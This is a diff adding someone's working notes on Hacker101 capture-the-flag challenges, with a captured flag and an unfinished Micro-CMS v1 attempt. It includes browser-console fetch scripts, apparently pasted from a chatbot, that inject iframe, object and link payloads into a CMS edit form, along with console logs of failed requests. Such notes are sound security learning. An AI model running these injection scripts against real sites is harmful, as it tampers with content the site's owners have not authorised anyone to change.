@@ -1,0 +1,529 @@
+
+1. F12 -> Network -> Refresh page -> background.png -> Right button -> Copy URL -> https://60741a0a4f9d3599e849ea54ccfe8ea7.ctf.hacker101.com/background.png
+
+
+https://60741a0a4f9d3599e849ea54ccfe8ea7.ctf.hacker101.com/background.png
+
+^FLAG^252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d$FLAG$
+^FLAG^252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d$FLAG$
+
+
+https://ctf.hacker101.com/ctf?flag=^FLAG^252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d$FLAG$
+
+
+#https://ctf.hacker101.com/ctf?flag=flag%7Bexample_here%7D
+
+
+https://ctf.hacker101.com/ctf?flag={^FLAG^252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d$FLAG$}
+
+%7B = {
+
+%7D = }
+
+
+https://ctf.hacker101.com/ctf?flag=flag%7B%5EFLAG%5E252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d%24FLAG%24%7D
+
+https://ctf.hacker101.com/ctf?flag=flag%7B%5EFLAG%5E252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d%24FLAG%24%7D
+
+
+
+https://ctf.hacker101.com/ctf?flag=FLAG%7B252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d%7D
+
+https://ctf.hacker101.com/ctf?flag=FLAG%7B252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d%7D
+
+https://ctf.hacker101.com/ctf?flag=%5EFLAG%5E252dc91c564fb722256cac99b9192edfd092bb79edcce733616014f13298aa4d%24FLAG%24
+
+-- Challenge#2 Micro-CMS v1. 
+
+
+
+
+https://ctf.hacker101.com
+
+1) Start → capture base URL
+
+Click Start and wait for the target URL to appear (something like https://micro-cms-v1-<random>.ctf.hacker101.com/).
+
+
+
+Note the exact origin (scheme + host). All further requests should be sent to that origin (so the browser sends cookies).
+
+Hints for "Micro-CMS v1"
+Flag0 -- Not Found
+
+- Try creating a new page -> opened the "Testing" link 
+- How are pages indexed?
+- Look at the sequence of IDs
+- If the front door doesn't open, try the window
+
+2) Passive reconnaissance (in-browser)
+
+2.1. Folowing the hint steps: 
+
+NewPage1
+https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/6
+NewPage2
+https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/7
+
+Open DevTools → Network and Console. Then:
+
+Check robots.txt and sitemap.xml:
+
+https://<target>/robots.txt -> not fount 
+
+https://<target>/sitemap.xml -> not found 
+
+Open https://<target>/ and view page source (Ctrl+U) — look for 
+
+forms, 
+endpoints, 
+or JS that mention /pages, /api, /create, /page.
+
+If you find any <form action="..."> or JS fetch URLs, note them — these are your primary endpoints.
+
+<!doctype html>
+<html>
+    <head>
+        <title>NewPage1</title>
+    </head>
+    <body>
+        <a href="../">&lt;-- Go Home</a><br> <--- endpoint?
+        <a href="edit/6">Edit this page</a> <--- endpoint?
+        <h1>NewPage1</h1>
+<p>A new page creation</p>
+    </body>
+</html>
+
+
+
+
+A new string added to the Flag0 hint 
+
+- In what ways can you retrieve page contents?
+
+
+
+<!doctype html>
+<html>
+    <head>
+        <title>ctf-microcms-test-1759843382425</title>
+    </head>
+    <body>
+        <a href="../">&lt;-- Go Home</a><br>
+        <a href="edit/2">Edit this page</a>
+        <h1>ctf-microcms-test-1759843382425</h1>
+<p>Just testing markdown.</p>
+<p><img alt="kitten" src="https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/" /></p>
+<p>raw html allowed?</p>
+    </body>
+</html>
+
+
+Yes — that “raw html allowed” line is absolutely a clue. It tells you that the CMS accepts at least some HTML in page bodies (we already saw an <img> rendered), and that you can use HTML tags to try to expose hidden resources (like a flag page) directly in the rendered page.
+
+Below I’ll explain the rationale briefly and give exact, copy–paste payloads and the exact POST commands to try (run them from DevTools → Console while on the challenge instance tab so cookies are included). Try the payloads in order until one reveals the flag.
+
+
+Why this matters (short)
+
+The page renders an <img> tag you supplied, so some HTML is preserved.
+
+The edit page text warned “scripts are not” allowed, so <script> likely blocked — but non-script HTML elements (iframe, img, object, embed, anchor) may work.
+
+If you can embed an element that points to a file or endpoint that contains the flag (for example /flag, /secret, /admin/flag, /pages/1), the browser will fetch that resource and either render it or make it accessible in the page (iframe/object) — letting you see the flag in the page source or visually.
+
+(async()=>{
+  const ep = "https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2"; // use the edit path you saw
+  const title = "ctf-microcms-test-ifr";
+  const body = `<iframe src="/flag" style="width:100%;height:200px;border:1px solid #000"></iframe>`;
+  const form = `title=${encodeURIComponent(title)}&body=${encodeURIComponent(body)}`;
+  const r = await fetch(ep, { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:form, credentials:"include", redirect:"manual" });
+  console.log("POST", ep, r.status, r.statusText, "Location:", r.headers.get("Location"));
+  // now open the public page that contains the iframe
+  const pagePath = window.location.pathname.replace(/\/edit\/\d+$/, "/2"); // or just open /2 or parent path
+  console.log("Open the page where iframe will appear (in same tab):", pagePath);
+})();
+
+
+(async()=>{
+  const ep = "/edit/2";
+  const title = "ctf-object-test";
+  const body = `<object data="/flag" style="width:100%;height:120px;"></object>`;
+  const form = `title=${encodeURIComponent(title)}&body=${encodeURIComponent(body)}`;
+  await fetch(ep, { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:form, credentials:"include", redirect:"manual" }).then(r=>console.log("done", r.status));
+  // open page to inspect
+  console.log("Open the page to view the object element.");
+})();
+
+
+(async()=>{
+  const ep = "/edit/2";
+  const title = "ctf-link-html-"+Date.now();
+  const body = "[clickme](/flag)\n\n<a href=\"/flag\">raw link</a>";
+  const form = `title=${encodeURIComponent(title)}&body=${encodeURIComponent(body)}`;
+  await fetch(ep, { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:form, credentials:"include", redirect:"manual" });
+  console.log("Posted link/html. Open view page and click the /flag link.");
+})();
+
+Promise {<pending>}[[Prototype]]: Promise[[PromiseState]]: "fulfilled"[[PromiseResult]]: undefined
+VM2561:6  POST https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/edit/2 404 (Not Found)
+(anonymous) @ VM2561:6
+(anonymous) @ VM2561:8
+VM2561:7 Posted link/html. Open view page and click the /flag link.
+
+
+(async()=>{
+  // 1) Find the edit link (resolving relative href)
+  const editLink = document.querySelector('a[href*="edit"]');
+  if (!editLink) {
+    console.log("No edit link found on this page.");
+    return;
+  }
+  const editUrl = new URL(editLink.getAttribute('href'), window.location.href).href;
+  console.log("Resolved edit URL:", editUrl);
+
+  // 2) GET the edit page to inspect the form (and to confirm availability)
+  try {
+    const getResp = await fetch(editUrl, { credentials: "include" });
+    console.log("GET edit ->", getResp.status, getResp.statusText);
+    const getHtml = await getResp.text();
+    console.log("First 1000 chars of edit page:\n", getHtml.slice(0,1000));
+
+    // parse form and determine action (absolute path)
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(getHtml, "text/html");
+    const form = doc.querySelector("form");
+    let actionPath;
+    if (form) {
+      // resolve form action relative to the edit page URL
+      const rawAction = form.getAttribute("action") || "";
+      const resolved = new URL(rawAction || editUrl, editUrl);
+      actionPath = resolved.href; // full absolute URL
+      console.log("Form action (resolved absolute URL):", actionPath);
+    } else {
+      // no form => fallback to posting to the edit URL itself
+      actionPath = editUrl;
+      console.log("No <form> found; will POST to the edit URL itself:", actionPath);
+    }
+
+    // 3) Prepare payload and POST
+    const title = "ctf-md-try-" + Date.now();
+    const body = "![tryflag](/flag)\n\n[open /flag](/flag)";
+    const formBody = `title=${encodeURIComponent(title)}&body=${encodeURIComponent(body)}`;
+
+    const postResp = await fetch(actionPath, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: formBody,
+      credentials: "include",
+      redirect: "manual"
+    });
+
+    console.log("POST ->", postResp.status, postResp.statusText);
+    console.log("Location header (if any):", postResp.headers.get("Location"));
+    const postText = await postResp.text();
+    console.log("First 1200 chars of POST response:\n", postText.slice(0,1200));
+
+    // 4) Suggest view page URL if we can infer it
+    // If editUrl looks like .../edit/2 or .../edit/123 we try to guess the public view path.
+    try {
+      const p = new URL(editUrl);
+      const pparts = p.pathname.split('/').filter(Boolean);
+      if (pparts.includes("edit")) {
+        // replace "edit" segment with nothing (or the numeric ID)
+        const idx = pparts.indexOf("edit");
+        const possibleId = pparts[idx+1] || "";
+        const guess1 = new URL(p.origin + "/" + possibleId, p).href;
+        const guess2 = new URL(p.origin + "/pages/" + possibleId, p).href;
+        console.log("Possible view pages to open (try these):", guess1, guess2);
+      } else {
+        console.log("If the edit URL is different structure, try clicking '<-- Go Home' and open the page listing.");
+      }
+    } catch(e){}
+
+    console.log("DONE. If POST returned 404 again, paste the console output here (GET/POST statuses and the first 1000 chars printed) and I will fix the target path.");
+  } catch (e) {
+    console.error("Network/exception while fetching edit page:", e);
+  }
+})();
+
+VM2663:9 Resolved edit URL: https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2
+Promise {<pending>}
+VM2663:14 GET edit -> 200 
+VM2663:16 First 1000 chars of edit page:
+ 
+<!doctype html>
+<html>
+    <head>
+        <title>Edit page</title>
+    </head>
+    <body>
+        <a href="../../">&lt;-- Go Home</a>
+        <h1>Edit Page</h1>
+        <form method="POST">
+            Title: <input type="text" name="title" value="ctf-microcms-test-ifr"><br>
+            <textarea name="body" rows="10" cols="80">&lt;iframe src=&quot;/flag&quot; style=&quot;width:100%;height:200px;border:1px solid #000&quot;&gt;&lt;/iframe&gt;</textarea><br>
+            <input type="submit" value="Save">
+            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
+        </form>
+    </body>
+</html>
+
+VM2663:28 Form action (resolved absolute URL): https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2
+VM2663:40  POST https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2 500 (Internal Server Error)
+(anonymous) @ VM2663:40
+await in (anonymous)
+(anonymous) @ VM2663:74
+VM2663:48 POST -> 500 
+VM2663:49 Location header (if any): null
+VM2663:51 First 1200 chars of POST response:
+ <!doctype html>
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+
+VM2663:64 Possible view pages to open (try these): https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/2 https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/pages/2
+VM2663:70 DONE. If POST returned 404 again, paste the console output here (GET/POST statuses and the first 1000 chars printed) and I will fix the target path.
+
+
+Nice work — that output is informative.
+
+What it tells us
+
+The form’s action is https://…/page/edit/2 (correct).
+
+Your POST hit that exact URL but the server returned 500 Internal Server Error — meaning the server code crashed while processing your payload. That can happen if the app chokes on certain content (markdown/html you sent) or if there’s a bug in the instance.
+
+The script also helpfully suggested two possible view URLs to try:
+
+https://…/<id> → https://…/2
+
+https://…/pages/2
+
+fetch('/flag', {credentials:'include'})
+  .then(r => r.text().then(t => console.log('/flag ->', r.status, '\n', t)).catch(()=>console.log('/flag ->', r.status, ' (binary)')))
+  .catch(e=>console.error('err',e));
+
+(async()=>{
+  const action = "https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2";
+  const title = "ctf-sanity-"+Date.now();
+  const body  = "hello";
+  const resp = await fetch(action, {
+    method: "POST",
+    headers: {"Content-Type":"application/x-www-form-urlencoded"},
+    body: `title=${encodeURIComponent(title)}&body=${encodeURIComponent(body)}`,
+    credentials: "include",
+    redirect: "manual"
+  });
+  console.log("SANITY POST ->", resp.status, resp.statusText, "Location:", resp.headers.get("Location"));
+  const txt = await resp.text();
+  console.log("Body (first 800 chars):\n", txt.slice(0,800));
+})();
+
+Promise {<pending>}
+VM3144:12 SANITY POST -> 0  Location: null
+VM3144:14 Body (first 800 chars):
+ 
+(async()=>{
+  const action = "https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2";
+  const title = "ctf-mdlink-"+Date.now();
+  const body = "[open-flag](/flag)";   // plain markdown link
+  const resp = await fetch(action, {
+    method: "POST",
+    headers: {"Content-Type":"application/x-www-form-urlencoded"},
+    body: `title=${encodeURIComponent(title)}&body=${encodeURIComponent(body)}`,
+    credentials: "include",
+    redirect: "manual"
+  });
+  console.log("MD LINK POST ->", resp.status, resp.statusText, "Location:", resp.headers.get("Location"));
+  console.log((await resp.text()).slice(0,800));
+})();
+
+https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/2
+https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/pages/2
+
+
+(async()=>{
+  console.log("=== START: Automated diagnostics for Micro-CMS v1 ===");
+
+  // 1) Direct /flag check
+  try {
+    const r1 = await fetch('/flag', { credentials: 'include' });
+    const t1 = await (r1.headers.get('content-type')||'').includes('text') ? r1.text() : Promise.resolve('(binary or no-text)');
+    console.log("\n[STEP 1] GET /flag ->", r1.status, r1.statusText);
+    console.log("[STEP 1] /flag response (first 1000 chars):\n", (typeof t1 === 'string') ? t1.slice(0,1000) : t1);
+  } catch(e) {
+    console.log("[STEP 1] GET /flag -> ERROR:", e.message);
+  }
+
+  // 2) Resolve edit link on current page
+  const editLink = document.querySelector('a[href*="edit"]');
+  if (!editLink) {
+    console.log("\n[STEP 2] No edit link found on this page. Stop.");
+    console.log("=== END ===");
+    return;
+  }
+  const editUrl = new URL(editLink.getAttribute('href'), window.location.href).href;
+  console.log("\n[STEP 2] Resolved edit URL:", editUrl);
+
+  // 3) GET edit page to inspect form and form action
+  try {
+    const getResp = await fetch(editUrl, { credentials: 'include' });
+    const getText = await getResp.text();
+    console.log("[STEP 3] GET edit ->", getResp.status, getResp.statusText);
+    console.log("[STEP 3] First 800 chars of edit page HTML:\n", getText.slice(0,800));
+    // parse form action
+    try {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(getText, "text/html");
+      const form = doc.querySelector("form");
+      if (form) {
+        const rawAction = form.getAttribute("action") || "";
+        const resolvedAction = new URL(rawAction || editUrl, editUrl).href;
+        console.log("[STEP 3] Form found. raw action:", rawAction || "(empty)");
+        console.log("[STEP 3] Resolved form action (absolute):", resolvedAction);
+      } else {
+        console.log("[STEP 3] No <form> element found in GET response. Will POST to edit URL itself.");
+      }
+    } catch(pe) {
+      console.log("[STEP 3] Error parsing form:", pe.message);
+    }
+  } catch(e) {
+    console.log("[STEP 3] GET edit -> ERROR:", e.message);
+  }
+
+  // 4) SANITY POST (urlencoded) to resolved action (prefer form action if present)
+  // Determine final action URL to POST to by inspecting the live DOM (prefer correct resolution)
+  let actionToUse;
+  try {
+    const liveEditLink = document.querySelector('a[href*="edit"]');
+    const liveEditUrl = new URL(liveEditLink.getAttribute('href'), window.location.href).href;
+    // attempt to fetch the edit page and parse the form action from the live HTML in memory (safer)
+    const resp = await fetch(liveEditUrl, { credentials: 'include' });
+    const html = await resp.text();
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const f = doc.querySelector('form');
+    if (f) {
+      actionToUse = new URL(f.getAttribute('action') || liveEditUrl, liveEditUrl).href;
+    } else {
+      actionToUse = liveEditUrl;
+    }
+  } catch(e) {
+    actionToUse = editUrl; // fallback
+  }
+  console.log("\n[STEP 4] Action URL chosen for POSTs:", actionToUse);
+
+  // Helper to print trimmed response
+  async function doPost(bodyType, bodyContent) {
+    try {
+      let opts = { method: "POST", credentials: "include", redirect: "manual" };
+      if (bodyType === 'urlencoded') {
+        opts.headers = {"Content-Type":"application/x-www-form-urlencoded"};
+        opts.body = bodyContent;
+      } else if (bodyType === 'formdata') {
+        opts.body = bodyContent; // FormData object
+      }
+      const pr = await fetch(actionToUse, opts);
+      const ct = pr.headers.get('content-type')||'';
+      const text = ct.includes('text') ? await pr.text() : '(binary or no-text)';
+      console.log(`\n[POST ${bodyType}] ->`, pr.status, pr.statusText, " Location:", pr.headers.get('Location'));
+      console.log(`[POST ${bodyType}] Response (first 800 chars):\n`, (typeof text === 'string') ? text.slice(0,800) : text);
+      return pr.status;
+    } catch(e) {
+      console.log(`[POST ${bodyType}] ERROR:`, e.message);
+      return null;
+    }
+  }
+
+  // 4a) POST minimal urlencoded
+  const title1 = "ctf-sanity-" + Date.now();
+  const body1  = "hello";
+  await doPost('urlencoded', `title=${encodeURIComponent(title1)}&body=${encodeURIComponent(body1)}`);
+
+  // 4b) POST markdown link (urlencoded)
+  const title2 = "ctf-mdlink-" + Date.now();
+  const body2  = "[open-flag](/flag)";
+  await doPost('urlencoded', `title=${encodeURIComponent(title2)}&body=${encodeURIComponent(body2)}`);
+
+  // 4c) POST FormData (multipart)
+  const fd = new FormData();
+  fd.append("title", "ctf-formdata-" + Date.now());
+  fd.append("body", "![tryflag](/flag)\n[open](/flag)");
+  await doPost('formdata', fd);
+
+  // 5) Suggest possible view URLs (best guesses)
+  try {
+    const u = new URL(editUrl);
+    const parts = u.pathname.split('/').filter(Boolean);
+    if (parts.includes("edit")) {
+      const idx = parts.indexOf("edit");
+      const possibleId = parts[idx+1] || "";
+      console.log("\n[STEP 5] Possible view URLs to open (try these):");
+      console.log(u.origin + "/" + possibleId);
+      console.log(u.origin + "/pages/" + possibleId);
+      console.log(u.origin + "/page/" + possibleId);
+    } else {
+      console.log("\n[STEP 5] Could not infer ID; try clicking '<-- Go Home' and open the page listing.");
+    }
+  } catch(e) {
+    console.log("[STEP 5] Error inferring view URLs:", e.message);
+  }
+
+  console.log("\n=== END diagnostics ===");
+})();
+
+VM3518:2 === START: Automated diagnostics for Micro-CMS v1 ===
+Promise {<pending>}
+VM3518:6  GET https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/flag 404 (Not Found)
+(anonymous) @ VM3518:6
+(anonymous) @ VM3518:128
+VM3518:8 
+[STEP 1] GET /flag -> 404 
+VM3518:9 [STEP 1] /flag response (first 1000 chars):
+ Promise {<pending>}
+VM3518:22 
+[STEP 2] Resolved edit URL: https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2
+VM3518:28 [STEP 3] GET edit -> 200 
+VM3518:29 [STEP 3] First 800 chars of edit page HTML:
+ 
+<!doctype html>
+<html>
+    <head>
+        <title>Edit page</title>
+    </head>
+    <body>
+        <a href="../../">&lt;-- Go Home</a>
+        <h1>Edit Page</h1>
+        <form method="POST">
+            Title: <input type="text" name="title" value="ctf-mdlink-1759853987277"><br>
+            <textarea name="body" rows="10" cols="80">[open-flag](/flag)</textarea><br>
+            <input type="submit" value="Save">
+            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
+        </form>
+    </body>
+</html>
+
+VM3518:38 [STEP 3] Form found. raw action: (empty)
+VM3518:39 [STEP 3] Resolved form action (absolute): https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2
+VM3518:69 
+[STEP 4] Action URL chosen for POSTs: https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/edit/2
+VM3518:84 
+[POST urlencoded] -> 0   Location: null
+VM3518:85 [POST urlencoded] Response (first 800 chars):
+ (binary or no-text)
+VM3518:84 
+[POST urlencoded] -> 0   Location: null
+VM3518:85 [POST urlencoded] Response (first 800 chars):
+ (binary or no-text)
+VM3518:84 
+[POST formdata] -> 0   Location: null
+VM3518:85 [POST formdata] Response (first 800 chars):
+ (binary or no-text)
+VM3518:116 
+[STEP 5] Possible view URLs to open (try these):
+VM3518:117 https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/2
+VM3518:118 https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/pages/2
+VM3518:119 https://a5cc6401cd90acee24d0b12fc581c408.ctf.hacker101.com/page/2
+VM3518:127 
+=== END diagnostics ===
